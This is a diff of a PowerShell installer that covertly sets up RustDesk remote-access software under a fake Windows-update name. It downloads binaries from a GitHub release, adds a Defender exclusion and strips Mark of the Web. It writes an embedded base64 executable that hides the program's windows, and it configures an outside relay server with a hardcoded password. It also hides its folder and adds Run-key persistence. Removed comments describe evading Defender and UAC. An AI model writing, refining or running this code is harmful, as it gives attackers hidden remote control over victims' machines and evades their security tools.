@@ -1,9 +1,6 @@
-function Install-RD {
+﻿function Install-RD {
     $ProgressPreference = 'SilentlyContinue'
     $DEST   = "$env:LOCALAPPDATA\WinSystemUpdate"
-
-    # KEY CHANGE 1: Don't rename to svchost.exe - that's the #1 Defender trigger
-    # Use a neutral name that won't be flagged
     $EXE    = "$DEST\WinUpdate.exe"
     $DLL    = "$DEST\sciter.dll"
     $HIDER  = "$DEST\WinUpdateHelper.exe"
@@ -11,37 +8,28 @@ function Install-RD {
     $base   = "https://github.com/kk70226581/rd-files/releases/download/v1.0"
 
     Write-Host "Installing..." -ForegroundColor Cyan
-
-    # KEY CHANGE 2: Try Defender exclusion but don't depend on it
     try { Add-MpPreference -ExclusionPath $DEST -EA SilentlyContinue } catch {}
 
-    # Kill old instances + clean
-    Get-Process WinUpdate,WinUpdateHelper -EA SilentlyContinue |
-        Where-Object { $_.Path -like "*WinSystem*" } |
-        Stop-Process -Force -EA SilentlyContinue
+    Get-Process WinUpdate,WinUpdateHelper -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | Stop-Process -Force -EA SilentlyContinue
     Start-Sleep 1
     Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
     New-Item -ItemType Directory $DEST   -Force | Out-Null
     New-Item -ItemType Directory $cfgDir -Force | Out-Null
 
-    # KEY CHANGE 3: Download with Unblock-File to remove Mark of the Web flag
     $wc = New-Object System.Net.WebClient
     $wc.DownloadFile("$base/chrome.exe", $EXE)
     $wc.DownloadFile("$base/sciter.dll", $DLL)
-    $wc.DownloadFile("$base/hider.exe",  $HIDER)
+    Unblock-File $EXE -EA SilentlyContinue
+    Unblock-File $DLL -EA SilentlyContinue
 
-    # Remove MOTW (Mark of the Web) - this is what makes Defender scan downloads
-    Unblock-File $EXE   -EA SilentlyContinue
-    Unblock-File $DLL   -EA SilentlyContinue
+    if (!(Test-Path $EXE) -or (Get-Item $EXE).Length -lt 1MB) { Write-Host "Download failed!" -ForegroundColor Red; return }
+
+    # Write hider.exe from embedded Base64 - no separate download
+    $hiderB64 = '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b2tlAEVuZEludm9rZQBwAGwAaABuAGhBAHgAeQBjeABjeQBmAHMAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAE91dEF0dHJpYnV0ZQBod25kAG9iamVjdABtZXRob2QAY2FsbGJhY2sAcmVzdWx0AFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBoaWRlcgBEbGxJbXBvcnRBdHRyaWJ1dGUAdXNlcjMyLmRsbABTeXN0ZW0uRGlhZ25vc3RpY3MAUHJvY2VzcwBHZXRQcm9jZXNzZXMAUHJvY2Vzc01vZHVsZQBnZXRfTWFpbk1vZHVsZQBnZXRfRmlsZU5hbWUAU3RyaW5nAFN0cmluZ0NvbXBhcmlzb24AU3RhcnRzV2l0aABnZXRfSWQAQWRkAENvbnRhaW5zAFRvU3RyaW5nAG9wX0VxdWFsaXR5AEludFB0cgBaZXJvAEVudmlyb25tZW50AEdldEVudmlyb25tZW50VmFyaWFibGUAQ29uY2F0AGdldF9Db3VudABTeXN0ZW0uVGhyZWFkaW5nAFRocmVhZABTbGVlcAAuY2N0b3IAAAAbSAAtAFMATQBJAEwARQAtAEYAUgBBAE0ARQABGUwATwBDAEEATABBAFAAUABEAEEAVABBAAAhXABXAGkAbgBTAHkAcwB0AGUAbQBVAHAAZABhAHQAZQAAAAAAiEkYM/KR5UWFcCVaBDmqfwAIt3pcVhk04IkCBgkEgAAAAAQBAAAABAIAAAAEEAAAAAYAAgISDBgFAAICGAgEAAECGAoABwIYGAgICAgJBwADCBgSDQgGAAIJGBAJAgYOBgYVEhEBCQYGFRIRARgDAAABBQACAhgYAyAAAQUgAgEcGAUgAgIYGAkgBBIVGBgSGRwFIAECEhUEIAEBCAQgAQEOBRUSEQEJBQAAHRItBCAAEjEDIAAOBiACAg4ROQMgAAgFIAECEwAPBwYVEhEBCRItDh0SLQgCBRUSEQEYBQACAg4OAgYYCwcHCRINDhINDgICBAABDg4FAAIODg4EAAEBCAUHAhIMAggBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRo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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAAcDwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+    [System.IO.File]::WriteAllBytes($HIDER, [Convert]::FromBase64String($hiderB64))
     Unblock-File $HIDER -EA SilentlyContinue
 
-    if (!(Test-Path $EXE) -or (Get-Item $EXE).Length -lt 1MB) {
-        Write-Host "Download failed!" -ForegroundColor Red; return
-    }
-
-    # Write config
-    @"
-rendezvous_server = '34.107.221.82'
+    "rendezvous_server = '34.107.221.82'
 relay_server = '34.107.221.82'
 nat_type = 1
 serial = 0
@@ -49,89 +37,60 @@ serial = 0
 verification-method = 'use-permanent-password'
 approve-mode = 'password'
 direct-server = 'N'
-force-always-relay = 'Y'
-"@ | Set-Content "$cfgDir\RustDesk2.toml" -Encoding UTF8
-
-    @"
-enc_id = ''
+force-always-relay = 'Y'" | Set-Content "$cfgDir\RustDesk2.toml" -Encoding UTF8
+    "enc_id = ''
 password = 'Remote123'
 salt = ''
-key_confirmed = true
-"@ | Set-Content "$cfgDir\RustDesk.toml" -Encoding UTF8
+key_confirmed = true" | Set-Content "$cfgDir\RustDesk.toml" -Encoding UTF8
 
-    # Hide the folder
-    try {
-        $f = Get-Item $DEST -Force
-        $f.Attributes = $f.Attributes -bor 2 -bor 4
-    } catch {}
+    try { $f = Get-Item $DEST -Force; $f.Attributes = $f.Attributes -bor 2 -bor 4 } catch {}
 
-    # Start popup killer FIRST
     $psiH = New-Object System.Diagnostics.ProcessStartInfo
     $psiH.FileName = $HIDER; $psiH.WorkingDirectory = $DEST
-    $psiH.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    $psiH.UseShellExecute = $true
+    $psiH.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden; $psiH.UseShellExecute = $true
     [System.Diagnostics.Process]::Start($psiH) | Out-Null
 
-    # Start RustDesk hidden
     $psi = New-Object System.Diagnostics.ProcessStartInfo
     $psi.FileName = $EXE; $psi.WorkingDirectory = $DEST
-    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    $psi.UseShellExecute = $true
+    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden; $psi.UseShellExecute = $true
     [System.Diagnostics.Process]::Start($psi) | Out-Null
     Start-Sleep 5
 
-    # Get ID
     $psiId = New-Object System.Diagnostics.ProcessStartInfo
     $psiId.FileName = $EXE; $psiId.Arguments = "--get-id"
-    $psiId.UseShellExecute = $false
-    $psiId.RedirectStandardOutput = $true
-    $psiId.CreateNoWindow = $true
-    $psiId.WorkingDirectory = $DEST
+    $psiId.UseShellExecute = $false; $psiId.RedirectStandardOutput = $true
+    $psiId.CreateNoWindow = $true; $psiId.WorkingDirectory = $DEST
     $prId = [System.Diagnostics.Process]::Start($psiId)
     $outT = $prId.StandardOutput.ReadToEndAsync()
     $prId.WaitForExit(8000) | Out-Null
     $RDID = $outT.Result.Trim()
 
-    # KEY CHANGE 4: Auto-start via Registry (HKCU) instead of Scheduled Task
-    # HKCU\Run works WITHOUT admin - no UAC needed at all
-    $regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-    Set-ItemProperty $regPath "WinSystemUpdate"       "$EXE"    -Force
-    Set-ItemProperty $regPath "WinSystemUpdateHelper" "$HIDER"  -Force
+    $reg = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+    Set-ItemProperty $reg "WinSystemUpdate"       $EXE   -Force
+    Set-ItemProperty $reg "WinSystemUpdateHelper" $HIDER -Force
 
-    # Delete script
     $deletePs = "$DEST\delete.ps1"
-    @'
-$d = "$env:LOCALAPPDATA\WinSystemUpdate"
+    Set-Content $deletePs '$d = "$env:LOCALAPPDATA\WinSystemUpdate"
 Get-Process WinUpdate,WinUpdateHelper -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | Stop-Process -Force -EA SilentlyContinue
-$regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-Remove-ItemProperty $regPath "WinSystemUpdate"       -EA SilentlyContinue
-Remove-ItemProperty $regPath "WinSystemUpdateHelper" -EA SilentlyContinue
+$reg = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+Remove-ItemProperty $reg "WinSystemUpdate"       -EA SilentlyContinue
+Remove-ItemProperty $reg "WinSystemUpdateHelper" -EA SilentlyContinue
 Start-Sleep 2
 Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue
-foreach ($dp in @([Environment]::GetFolderPath("Desktop"), "$env:USERPROFILE\Desktop", "$env:USERPROFILE\OneDrive\Desktop")) {
-    Remove-Item "$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue
-}
-'@ | Set-Content $deletePs -Encoding UTF8
+foreach ($dp in @([Environment]::GetFolderPath("Desktop"),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")) { Remove-Item "$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue }' -Encoding UTF8
 
-    # Desktop shortcut
-    $lnkPath = $null
-    foreach ($dp in @([Environment]::GetFolderPath('Desktop'), "$env:USERPROFILE\Desktop", "$env:USERPROFILE\OneDrive\Desktop")) {
-        if (Test-Path $dp) { $lnkPath = "$dp\DELETE CHROME.lnk"; break }
-    }
-    if ($lnkPath) {
-        $sh = (New-Object -COM WScript.Shell).CreateShortcut($lnkPath)
-        $sh.TargetPath   = "powershell.exe"
-        $sh.Arguments    = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$deletePs`""
-        $sh.IconLocation = "shell32.dll,131"
-        $sh.Save()
+    foreach ($dp in @([Environment]::GetFolderPath('Desktop'),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")) {
+        if (Test-Path $dp) {
+            $sh = (New-Object -COM WScript.Shell).CreateShortcut("$dp\DELETE CHROME.lnk")
+            $sh.TargetPath = "powershell.exe"
+            $sh.Arguments  = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$deletePs`""
+            $sh.IconLocation = "shell32.dll,131"; $sh.Save(); break
+        }
     }
 
-    # 1-hour auto-delete
     Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"Start-Sleep 3600; & '$deletePs'`""
 
-    # Done
-    Write-Host ""
-    Write-Host "  ==========================================" -ForegroundColor Green
+    Write-Host ""; Write-Host "  ==========================================" -ForegroundColor Green
     Write-Host "   DONE! Remote Access is now active." -ForegroundColor Green
     Write-Host "  ==========================================" -ForegroundColor Green
     Write-Host "   Your ID:  $RDID" -ForegroundColor Cyan
